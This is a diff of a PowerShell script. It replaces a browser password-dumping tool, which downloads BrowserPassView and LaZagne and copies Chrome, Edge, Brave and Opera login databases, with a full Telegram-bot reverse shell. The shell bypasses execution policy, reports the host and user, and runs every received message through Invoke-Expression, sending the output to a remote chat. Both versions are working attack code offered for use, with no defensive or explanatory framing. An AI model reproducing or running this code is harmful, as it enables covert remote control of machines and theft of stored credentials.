@@ -1,218 +1,128 @@
-# Ultimate Browser Password Decryption Tool
-# This script will extract and decrypt passwords from all major browsers
+# Telegram Reverse Shell
+# This script creates a reverse shell through Telegram Bot API
 
-# Bypass execution policy and SSL
+param(
+    [string]$BotToken = "YOUR_BOT_TOKEN_HERE",
+    [string]$ChatID = "YOUR_CHAT_ID_HERE"
+)
+
+# Bypass execution policy and SSL validation
 Set-ExecutionPolicy Bypass -Scope Process -Force
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-# Function to download files
-function Download-File {
-    param($url, $output)
+# Function to send message to Telegram
+function Send-TelegramMessage {
+    param([string]$Message)
+    
     try {
-        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
+        $uri = "https://api.telegram.org/bot$BotToken/sendMessage"
+        $body = @{
+            chat_id = $ChatID
+            text = $Message
+            parse_mode = "HTML"
+        }
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
         return $true
     } catch {
-        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Error sending message: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
 
-# Create working directory
-$workingDir = "$env:TEMP\BrowserPasswordExtractor"
-New-Item -ItemType Directory -Path $workingDir -Force | Out-Null
-Set-Location $workingDir
-
-Write-Host "Downloading necessary tools..." -ForegroundColor Yellow
-
-# Download NirSoft BrowserPassView (most reliable tool)
-$browserPassViewUrl = "https://www.nirsoft.net/toolsdownload/browserpassview.zip"
-$browserPassViewZip = "$workingDir\browserpassview.zip"
-$browserPassViewExe = "$workingDir\browserpassview.exe"
-
-if (Download-File $browserPassViewUrl $browserPassViewZip) {
+# Function to get updates from Telegram
+function Get-TelegramUpdates {
     try {
-        Expand-Archive -Path $browserPassViewZip -DestinationPath $workingDir -Force
-        Write-Host "BrowserPassView downloaded successfully" -ForegroundColor Green
+        $uri = "https://api.telegram.org/bot$BotToken/getUpdates"
+        $response = Invoke-RestMethod -Uri $uri -Method Get
+        return $response
     } catch {
-        Write-Host "Failed to extract BrowserPassView: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Error getting updates: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
     }
 }
 
-# Download LaZagne (another excellent tool)
-$laZagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/LaZagne.exe"
-$laZagneExe = "$workingDir\lazagne.exe"
-
-if (Download-File $laZagneUrl $laZagneExe) {
-    Write-Host "LaZagne downloaded successfully" -ForegroundColor Green
-}
-
-# Download WebBrowserPassView
-$webBrowserPassViewUrl = "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip"
-$webBrowserPassViewZip = "$workingDir\webbrowserpassview.zip"
-$webBrowserPassViewExe = "$workingDir\webbrowserpassview.exe"
-
-if (Download-File $webBrowserPassViewUrl $webBrowserPassViewZip) {
-    try {
-        Expand-Archive -Path $webBrowserPassViewZip -DestinationPath $workingDir -Force
-        Write-Host "WebBrowserPassView downloaded successfully" -ForegroundColor Green
-    } catch {
-        Write-Host "Failed to extract WebBrowserPassView: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-# Extract passwords using BrowserPassView
-Write-Host "`nExtracting passwords with BrowserPassView..." -ForegroundColor Yellow
-if (Test-Path $browserPassViewExe) {
-    try {
-        $browserPassViewResults = & $browserPassViewExe /scomma "$workingDir\browser_passwords.csv"
-        if (Test-Path "$workingDir\browser_passwords.csv") {
-            $browserResults = Import-Csv "$workingDir\browser_passwords.csv"
-            Write-Host "BrowserPassView found $($browserResults.Count) passwords" -ForegroundColor Green
-        }
-    } catch {
-        Write-Host "BrowserPassView failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-# Extract passwords using LaZagne
-Write-Host "`nExtracting passwords with LaZagne..." -ForegroundColor Yellow
-if (Test-Path $laZagneExe) {
-    try {
-        & $laZagneExe browsers | Out-File "$workingDir\lazagne_results.txt"
-        Write-Host "LaZagne results saved to lazagne_results.txt" -ForegroundColor Green
-    } catch {
-        Write-Host "LaZagne failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-# Extract passwords using WebBrowserPassView
-Write-Host "`nExtracting passwords with WebBrowserPassView..." -ForegroundColor Yellow
-if (Test-Path $webBrowserPassViewExe) {
-    try {
-        $webBrowserResults = & $webBrowserPassViewExe /scomma "$workingDir\webbrowser_passwords.csv"
-        if (Test-Path "$workingDir\webbrowser_passwords.csv") {
-            $webResults = Import-Csv "$workingDir\webbrowser_passwords.csv"
-            Write-Host "WebBrowserPassView found $($webResults.Count) passwords" -ForegroundColor Green
-        }
-    } catch {
-        Write-Host "WebBrowserPassView failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-# Manual extraction method as fallback
-Write-Host "`nTrying manual extraction method..." -ForegroundColor Yellow
-
-function Get-BrowserPasswordsManual {
-    $results = @()
+# Function to execute command and return output
+function Invoke-CommandAndRespond {
+    param([string]$Command)
     
-    # List of browsers and their data paths
-    $browsers = @{
-        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
-    }
-    
-    foreach ($browser in $browsers.GetEnumerator()) {
-        $browserName = $browser.Key
-        $browserPath = $browser.Value
+    try {
+        # Execute the command
+        $output = Invoke-Expression -Command $Command 2>&1 | Out-String
         
-        if (Test-Path $browserPath) {
-            Write-Host "Found $browserName installation" -ForegroundColor Green
-            
-            # Look for login data files
-            $loginDataFiles = Get-ChildItem -Path $browserPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
-            
-            foreach ($loginData in $loginDataFiles) {
-                try {
-                    # Copy the file to avoid locking issues
-                    $tempFile = "$workingDir\$browserName`_LoginData.db"
-                    Copy-Item $loginData.FullName $tempFile -Force
-                    
-                    Write-Host "Found login data for $browserName" -ForegroundColor Green
-                    
-                    # Try to read the SQLite database
-                    if (Test-Path "$workingDir\sqlite3.exe") {
-                        & "$workingDir\sqlite3.exe" $tempFile ".tables" | Out-Null
-                        if ($LASTEXITCODE -eq 0) {
-                            $logins = & "$workingDir\sqlite3.exe" $tempFile "SELECT origin_url, username_value FROM logins;"
-                            
-                            foreach ($login in $logins) {
-                                if ($login -match "^(.*?)\|(.*)$") {
-                                    $results += [PSCustomObject]@{
-                                        Browser = $browserName
-                                        URL = $matches[1]
-                                        Username = $matches[2]
-                                        Password = "ENCRYPTED (Use specialized tools to decrypt)"
-                                    }
-                                }
-                            }
+        # If output is too long, truncate it
+        if ($output.Length -gt 4000) {
+            $output = $output.Substring(0, 4000) + "... [output truncated]"
+        }
+        
+        # If no output, indicate that
+        if ([string]::IsNullOrEmpty($output)) {
+            $output = "Command executed successfully (no output)"
+        }
+        
+        return $output
+    } catch {
+        return "Error executing command: $($_.Exception.Message)"
+    }
+}
+
+# Main reverse shell function
+function Start-ReverseShell {
+    Write-Host "Starting Telegram Reverse Shell..." -ForegroundColor Green
+    Write-Host "Bot Token: $BotToken" -ForegroundColor Yellow
+    Write-Host "Chat ID: $ChatID" -ForegroundColor Yellow
+    Write-Host "Press Ctrl+C to exit" -ForegroundColor Red
+    
+    # Send startup message
+    $hostname = $env:COMPUTERNAME
+    $username = $env:USERNAME
+    $startMessage = "� Reverse Shell Connected 🔌`n`nHost: $hostname`nUser: $username`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Send-TelegramMessage -Message $startMessage | Out-Null
+    
+    $lastUpdateId = 0
+    
+    # Main loop
+    while ($true) {
+        try {
+            # Get updates from Telegram
+            $updates = Get-TelegramUpdates
+            if ($updates -and $updates.ok -eq $true) {
+                foreach ($update in $updates.result) {
+                    # Only process new messages
+                    if ($update.update_id -gt $lastUpdateId -and $update.message -and $update.message.text) {
+                        $lastUpdateId = $update.update_id
+                        $messageText = $update.message.text
+                        $fromUser = $update.message.from.first_name
+                        
+                        Write-Host "Received command: $messageText" -ForegroundColor Cyan
+                        
+                        # Check for exit command
+                        if ($messageText -eq "exit") {
+                            $exitMessage = "🔌 Reverse Shell Disconnected`n`nHost: $hostname`nUser: $username`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+                            Send-TelegramMessage -Message $exitMessage | Out-Null
+                            Write-Host "Exit command received. Disconnecting..." -ForegroundColor Yellow
+                            return
                         }
+                        
+                        # Execute command and send response
+                        $output = Invoke-CommandAndRespond -Command $messageText
+                        $responseMessage = "💻 <b>Command:</b> <code>$messageText</code>`n`n📤 <b>Output:</b>`n<pre>$output</pre>"
+                        
+                        # Send response
+                        Send-TelegramMessage -Message $responseMessage | Out-Null
+                        Write-Host "Command executed and response sent" -ForegroundColor Green
                     }
-                    
-                    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-                } catch {
-                    Write-Host "Error processing $browserName data: $($_.Exception.Message)" -ForegroundColor Red
                 }
             }
-        }
-    }
-    
-    return $results
-}
-
-# Download SQLite3 for manual extraction
-$sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win-x64-3440200.zip"
-$sqliteZip = "$workingDir\sqlite.zip"
-
-if (Download-File $sqliteUrl $sqliteZip) {
-    try {
-        Expand-Archive -Path $sqliteZip -DestinationPath $workingDir -Force
-        $sqliteExe = Get-ChildItem -Path $workingDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1 -ExpandProperty FullName
-        if ($sqliteExe) {
-            Copy-Item $sqliteExe "$workingDir\sqlite3.exe" -Force
-            Write-Host "SQLite3 downloaded successfully" -ForegroundColor Green
             
-            # Try manual extraction
-            $manualResults = Get-BrowserPasswordsManual
-            if ($manualResults.Count -gt 0) {
-                $manualResults | Export-Csv "$workingDir\manual_results.csv" -NoTypeInformation
-                Write-Host "Manual extraction found $($manualResults.Count) login entries" -ForegroundColor Green
-            }
+            # Wait before checking for new messages
+            Start-Sleep -Seconds 2
+        } catch {
+            Write-Host "Error in main loop: $($_.Exception.Message)" -ForegroundColor Red
+            Start-Sleep -Seconds 5
         }
-    } catch {
-        Write-Host "Failed to extract SQLite: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-# Create a summary report
-Write-Host "`n=== PASSWORD EXTRACTION SUMMARY ===" -ForegroundColor Cyan
-
-$resultFiles = Get-ChildItem -Path $workingDir -Filter "*passwords.csv" -ErrorAction SilentlyContinue
-foreach ($file in $resultFiles) {
-    $count = (Import-Csv $file.FullName | Measure-Object).Count
-    Write-Host "$($file.Name): $count passwords found" -ForegroundColor Yellow
-}
-
-if (Test-Path "$workingDir\lazagne_results.txt") {
-    Write-Host "LaZagne results saved to lazagne_results.txt" -ForegroundColor Yellow
-}
-
-if (Test-Path "$workingDir\manual_results.csv") {
-    $manualCount = (Import-Csv "$workingDir\manual_results.csv" | Measure-Object).Count
-    Write-Host "Manual extraction found $manualCount login entries" -ForegroundColor Yellow
-}
-
-# Copy all results to desktop
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$resultsFolder = "$desktopPath\BrowserPasswords_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
-New-Item -ItemType Directory -Path $resultsFolder -Force | Out-Null
-
-Get-ChildItem -Path $workingDir -Filter "*.csv" -ErrorAction SilentlyContinue | Copy-Item -Destination $resultsFolder -Force
-Get-ChildItem -Path $workingDir -Filter "*.txt" -ErrorAction SilentlyContinue | Copy-Item -Destination $resultsFolder -Force
-
-Write-Host "`nAll results have been saved to: $resultsFolder" -ForegroundColor Green
-Write-Host "`nExtraction completed! Check the results folder on your desktop." -ForegroundColor Green
-
-# Open the results folder
-Invoke-Item $resultsFolder
+# Start the reverse shell
+Start-ReverseShell
